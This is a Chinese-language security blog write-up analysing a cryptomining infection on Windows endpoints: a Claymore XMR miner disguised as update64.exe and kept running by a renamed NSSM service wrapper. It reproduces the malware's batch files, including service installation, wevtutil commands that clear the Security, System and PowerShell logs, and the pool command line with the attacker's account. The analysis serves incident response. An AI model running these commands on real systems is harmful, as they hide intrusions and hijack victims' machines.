## *** 本文作者：CGF99** **，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

## 一、背景  

 **近期接到客户反馈，其网络中有部分 Windows 系统终端机器异常，安全团队经过分析，发现其仍旧是一起网络挖矿事件。**

## 二、基本情况

通过对受害终端进行检查，发现有一个进程update64.exe占用CPU极高，该进程位于c:\windows\dell目录下。

任务管理器根据CPU排序后，其占用99%CPU，权限是SYSTEM权限。

如下图所示：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/1527066016166.png!small)

用任务管理其杀掉update64.exe进程，马上重新启动，靠，这么暴力啊？

直接调用命令wmic process where Name="update64.exe" get
ParentProcessId查看其父进程，发现竟然是cmd.exe不停的在启动update64.exe，而且cmd.exe是system权限运行的，如下图所示：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270660433596.png!small)

杀掉该cmd.exe，发现其也是不停的重新启动，晕，太暴力了。

继续查看其父进程

    
    
    wmic process where Name="cmd.exe" get ParentProcessId 

发现cmd.exe是由svchost.exe进程启动的，其位置也在c:\windows\dell目录下，权限也是system权限，进程描述为“the
Non-Sucking Service Manager”。

如下图所示：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270660701904.png!small)

采用svchost.exe
->cmd.exe->update64.exe的顺序杀掉进程，update64.exe进程不会重新再次启动，说明c:\windows\dell\svchost.exe就是用于负责启动并且保护update64.exe进程的。

1、运行cmd.exe，进入c:\windows\dell目录，命令dir /a
查看后，发现该目录下有四个文件，分别是run.bat、run64.bat、svchost.exe和Update64.exe。

2、获取文件HASH

利用window自带命令行工具certutil.exe，获取文件SHA256 HASH。

certutil.exe用法：

> certutil.exe -hashfile 目标文件名 SHA256

SHA256 HASH列表如下：

文件名  |  大小  |  文件HASH（SHA256）  
---|---|---  
Run.bat  |  214  |
f86f90440a2b36c0c477a6ce6df732d274b29605388c55b952bc1028e4e0af94  
Run64.bat  |  95  |
dbc8422a6e73459e777bb1989aa26c0f4416fe99e93e234a6b3c0ae9539ff603  
Svchost.exe  |  353,792  |
29f0dbf2d07c4b68c3c9ee0d139d80bad3e9058fbf9dbd574cb5b047cf742e74  
Update64.exe  |  2,594,816  |
c1fee6f3375b891081fa9815c620ad8c1a80e3c62dccc7f24c5afee72cf3ddcd  
  
备注：

撰写本文时，发现当天（5月23日）FREEBUF上发布了一篇文章，“SURFSRC |
一个针对“比特票”挖矿木马样本的分析”，连接网址为：【<http://www.freebuf.com/articles/system/172579.html>】，其中分析的样本与我方分析的样本基本类似，尤其是其中Svchost.exe为同一个程序，因为其HASH值相同。晕，好吧。既然已经撰写了，就厚脸继续投稿了，毕竟技术上可以互相印证。其他有些差异的地方，大家可以对照两文，互相补充。

3、此外，习惯性的运行命令dir /a /od检查，在c:\windows\目下发现一个名为Update.exe文件。

文件名  |  大小  |  HASH（SHA256）  
---|---|---  
Update.exe  |  2,854,829  |
aeb8ecc2ad424926af154172c6f2d2f8a98b881f59389fe75e1a2408bdcb3927  
  
简单分析发现Update.exe其实是winrar创建的自解压exe文件。查看其文件属性，发现其自解压命令如下图所示。

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270662067853.png!small)

Update.exe运行后会把文件解压缩到c:\windows\dell目录下（覆盖模式），同时运行c:\windows\dell\run.bat批处理文件（静默后台运行）。

能解压到c:\windows目录下，说明入侵者具备了超级权限。

判断：入侵者通过某种入侵手段（未知，比如漏洞攻击、邮件攻击、欺骗手段比如直接发给目标一个update.exe，说是啥啥啥的压缩包文件，让其双击执行解压等）获取系统权限，并执行update.exe解压缩到c:\windows\dell目录。

4、进程与网络连接

运行tasklist命令，update64.exe进程号为364，如下图。

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270662293933.png!small)运行nentstat–noa
命令查看，364号进程的网络链接如下图。

### ![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270662445321.png!small)

## 三、样本分析

###  **（一）run.bat**

 **1、文件内容**

> C:\Windows\dell\svchost.exe install"Windows32_Update"
> "C:\Windows\dell\run64.bat"
>
> C:\Windows\dell\svchost.exe startWindows32_Update
>
> wevtutil cl "windows powershell"
>
> wevtutil cl "security"
>
> wevtutil cl "system"

  

  

 **2、批处理命令解析**

> a) **安装** Windows32_Update服务。 **利用** C:\Windows\dell\ **svchost.exe**
> **进程安装一个windows系统服务，名为”** Windows32_Update”，其对应的可执行路径为：
> C:\Windows\dell\run64.bat。
>
> b) 启动Windows32_Update服务
>
> c) 调用系统自带”Windows 事件命令行工具wevtutil.exe清理日志信息
>
> 清除windows powershell启动运行日志
>
> 清除windows日志之安全日志
>
> 清除windows日志之系统日志

安全日志和系统日志比较常见，windows powershell日志记录的是系统windows
powershell脚本运行的痕迹，其在事件查看器中的位置如下图所示：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270664959859.png!small)

 **3、Wevtutil.exe简介**

Wevtutil.exe是系统自带的系统日志命令行管理工具，位于c:\windows\system32\目录下，其命令行参数如下所示：

wevtutil COMMAND [ARGUMENT [ARGUMENT] ...] [/OPTION:VALUE [/OPTION:VALUE] ...]  
命令:  
el | enum-logs 列出日志名称。  
gl | get-log 获取日志配置信息。  
sl | set-log 修改日志配置。  
ep | enum-publishers 列出事件发布者。  
gp | get-publisher 获取发布者配置信息。  
im | install-manifest 从清单中安装事件发布者和日志。  
um | uninstall-manifest 从清单中卸载事件发布者和日志。  
qe | query-events 从日志或日志文件中查询事件。  
gli | get-log-info 获取日志状态信息。  
epl | export-log 导出日志。  
al | archive-log 存档导出的日志。  
cl | clear-log 清除日志。  
常用选项:  
/{r | remote}:VALUE 如果指定，则在远程计算机上运行该命令。VALUE 是远程计算机名称。  
/im 和 /um 选项不支持远程操作。  
/{u | username}:VALUE 指定一个不同的用户以登录到远程计算机。 VALUE 是 domain\user 或 user
形式的用户名。只有在指定 /r 选项时才适用。  
/{p | password}:VALUE 指定的用户密码。如果未指定， 或者 VALUE 为 "*"，则会提示用户输入密码。 只有在指定 /u
选项时才适用。  
/{a | authentication}:[Default|Negotiate|Kerberos|NTLM] 用于连接到远程计算机的身份验证类型。默认值为
Negotiate。  
/{uni | unicode}:[true|false] 使用 Unicode 显示输出。如果为 true，则使用 Unicode 显示输出。  
---  
  
  
  
**4、疑问**

> a) 清除系统日志的动机大家都很清楚，无外乎隐藏攻击者痕迹。为什么要清除windows
> powershell日志呢？除非在整个入侵或者渗透过程中，攻击者利用powershell执行了某些指令？可是如何查看其执行的指令呢？是否预示。。。？毕竟现在还不清楚入侵手段。
>
> b) 怎么能够把一个.bat文件注册为服务进程呢？
>
> c) 安装系统服务是必须具备超级用户权限的，入侵者是通过何种手段进入的，又是如何躲避UAC的？

在实验机器上手动执行该run.bat批处理，其运行界面如下：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270665239975.png!small)

###  **（二）Run64.bat**

 **1、文件内容**

 ****

    
    
     **Update64 -ostratum+tcp://xmr.pool.minergate.com:45560 -u cooldayright@outlook.com -p x-dbg -1**

  

  

 **2、命令解析**

从run64.bat内容我们可以估计Update64.exe就是一个挖矿程序，其挖掘的是XMR虚拟货币，矿池是xmr.pool.minergate.com:45560，挖矿帐号是：[cooldayright@outlook.com](mailto:cooldayright@outlook.com)。

 **3、MinerGate简介**

MinerGate是国外一个知名的挖矿网站，支持很多种虚拟或货币的挖矿、转账交易等，其网站主页为：<https://minergate.com/>。

根据网站主页显示，目前支持BTC、XMR、以太坊等16种主流的虚拟货币，具体支持的货币如下图所示：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270666873240.png!small)

在网站上可以直观查看挖矿收益，而且支持的系统很多，目前已经支持安卓手机，适合各种人群。一句话总结，Minergate就是一款或许是最简单的入门的挖矿工具！

 **补充：**

第一、在Minergate网站注册时必须利用真实有效的邮箱地址进行注册确认，因此，[cooldayright@outlook.com](mailto:cooldayright@outlook.com)邮箱是攻击者的真实有效EMAIL。

 **第二、根据minergate网站提示，其用于xmr挖矿的端口已经修改为45700，而本样本依然连接的是45560端口，或许攻击者还会采取下一步动作？  
**

 **![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270667534642.png!small)**

###  **（三）svchost.exe**

 **查看文件属性，如下图：**

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270667726327.png!small)

打开baidu，搜索nssm.exe，结果如下。

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270667899968.png!small)

我们发现，svchost.exe其实就是服务管理软件nssm.exe，其官网地址为：<http://nssm.cc/>，github上NSSM（<https://github.com/kirillkovalenko/nssm>）。

根据网络查询，NSSM是一个服务封装程序，它可以将普通exe程序封装成服务，使之像windows服务一样运行。同类型的工具还有微软自己的srvany，不过nssm更加简单易用，并且功能强大。

它的特点如下：

> l 支持普通exe程序（控制台程序或者带界面的Windows程序都可以）
>
> l 安装简单，修改方便
>
> l 可以重定向输出（并且支持Rotation）
>
> l 可以自动守护封装了的服务，程序挂掉了后可以自动重启
>
> l 可以自定义环境变量

  

至此，上面的疑问（.bat文件如何能注册为服务进程）终于得到了解决。NSSM很强大，真的很强大！！！！

怪不得，上面杀了update64.exe，过一会该进程就重新启动。

###  **（四）Update64.exe**

从run64.bat我们可知，其实Update64.exe就是一个挖矿软件。文件属性如下图所示，文件修改时间为2016年9月2日。

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270668588562.png!small)

根据经验，很多挖矿软件都自带命令行帮助文件，于是我们直接在命令行下运行该程序，结果却如下所示：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270668743999.png!small)

说明该程序应该是经过重新修改编译了。

直接加上参数运行（调用run64.bat），发现其竟然是有控制台显示的（利用system权限调用也是有原因，至少不会弹出黑屏框），其显示的界面如下图所示：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270668941153.png!small)

根据网络查询，发现Update64就是Claymore-XMR-CPU-Miner，版本为3.5版本，一款利用开源的利用cpu挖掘xmr币的软件，其github地址为：[https://github.com/nanopool/Claymore-XMR-CPU-Miner/releases。目前已经更新到4.0](https://github.com/nanopool/Claymore-XMR-CPU-Miner/releases%E3%80%82%E7%9B%AE%E5%89%8D%E5%B7%B2%E7%BB%8F%E6%9B%B4%E6%96%B0%E5%88%B04.0)版本。

Claymore支持多种虚拟货币挖矿：

![挖矿恶意程序纪实分析之 Windows
篇](https://image.3001.net/images/20180523/15270669092264.png!small)

由于minergate网站没有提供直接挖矿收益查询功能，注册用户只能查看其自身收益情况，因此无法得知攻击者[cooldayright@outlook.com](mailto:cooldayright@outlook.com)收益情况。

## 四、总结与疑问

> 1、卸载服务。
>
> 2、删除文件实体。
>
>
> 3、入侵手法未知？也就是压缩档文件update.exe是如何进入到用户系统的，目前不知道，还有整个分析过程没有发现“powershell”命令运行痕迹，结合run.bat里面清除”powershell”日志，是否有可能是利用某些漏洞攻击手法（比如doc文档攻击，里面调用powershell命令下载文件执行？可是不对，文档类攻击无法获取system权限？）
>
> 4、难道真的是直接发送给用户update.exe让其运行，可是为什么会在c:\windows目录下呢？
>
>
> 5、如果是自动化入侵手段，应该是利用漏洞攻击手法，比如前期的jboss、websphere等软件漏洞，在window系统下可以直接获取system权限。可是有些终端主机都是简单的客户端，没有对外提供服务？有可能是先控制的服务器，然后进行内网渗透？岂不是全网沦陷了？汗。。。
>
> 6、带着疑问。。。继续前行吧，网络安全永远在路上。

 *** 本文作者：CGF99** **，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

